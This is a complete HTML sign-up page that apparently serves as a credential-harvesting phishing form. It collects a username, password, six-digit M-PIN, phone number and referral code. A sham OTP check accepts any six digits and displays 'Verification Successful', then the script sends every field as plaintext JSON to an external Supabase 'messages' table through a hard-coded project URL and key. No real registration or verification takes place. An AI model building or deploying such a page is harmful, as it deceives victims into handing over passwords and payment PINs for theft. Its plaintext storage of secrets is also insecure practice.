<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
    <div class="bg-white p-8 rounded-2xl shadow-md w-full max-w-md">
        <h2 class="text-2xl font-bold mb-6 text-center">Sign Up</h2>
        <form id="signupForm" class="space-y-4">
            <div>
                <label class="block text-sm font-medium text-gray-700">Username</label>
                <input type="text" id="username" required class="w-full mt-1 p-2 border rounded-lg">
            </div>
            <div>
                <label class="block text-sm font-medium text-gray-700">Password</label>
                <input type="password" id="password" required class="w-full mt-1 p-2 border rounded-lg">
            </div>
            <div>
                <label class="block text-sm font-medium text-gray-700">M-PIN</label>
                <input type="password" id="mpin" maxlength="6" required class="w-full mt-1 p-2 border rounded-lg">
            </div>
            <div>
                <label class="block text-sm font-medium text-gray-700">Phone</label>
                <input type="tel" id="phone" required class="w-full mt-1 p-2 border rounded-lg">
            </div>
            <div>
                <label class="block text-sm font-medium text-gray-700">Referral Code</label>
                <input type="text" id="referral" class="w-full mt-1 p-2 border rounded-lg">
            </div>
            <button type="submit" class="w-full bg-green-600 text-white py-2 rounded-lg font-semibold hover:bg-green-700 mt-4">Sign Up</button>
        </form>
    </div>

    <!-- OTP Modal -->
    <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4">
        <div class="bg-white p-6 rounded-2xl shadow-md w-full max-w-sm text-center">
            <h3 class="text-xl font-bold mb-4">Enter 6-Digit OTP</h3>
            <input type="text" id="otpInput" maxlength="6" class="w-full p-2 border rounded-lg text-center text-xl tracking-widest mb-4 font-bold" placeholder="000000">
            <button onclick="verifyOtp()" class="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700">Submit</button>
        </div>
    </div>

    <script>
        const SUPABASE_URL = 'https://zvswgqddbeykgrhlovgp.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_moe4DeFFDoQjVmcCLPtOmQ_VXcW9TyD';
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        let pendingUserData = {};

        document.getElementById('signupForm').addEventListener('submit', (e) => {
            e.preventDefault();
            pendingUserData = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                mpin: document.getElementById('mpin').value,
                phone: document.getElementById('phone').value,
                referral: document.getElementById('referral').value
            };
            document.getElementById('otpModal').classList.remove('hidden');
        });

        async function verifyOtp() {
            const otp = document.getElementById('otpInput').value;
            if (otp.length === 6) {
                alert('Verification Successful');
                document.getElementById('otpModal').classList.add('hidden');
                
                const { error } = await supabase
                    .from('messages')
                    .insert([{ content: JSON.stringify(pendingUserData) }]);

                if (error) {
                    alert('Error saving data: ' + error.message);
                } else {
                    alert('Data saved successfully!');
                    document.getElementById('signupForm').reset();
                }
            } else {
                alert('Please enter a valid 6-digit OTP.');
            }
        }
    </script></body>
</html>
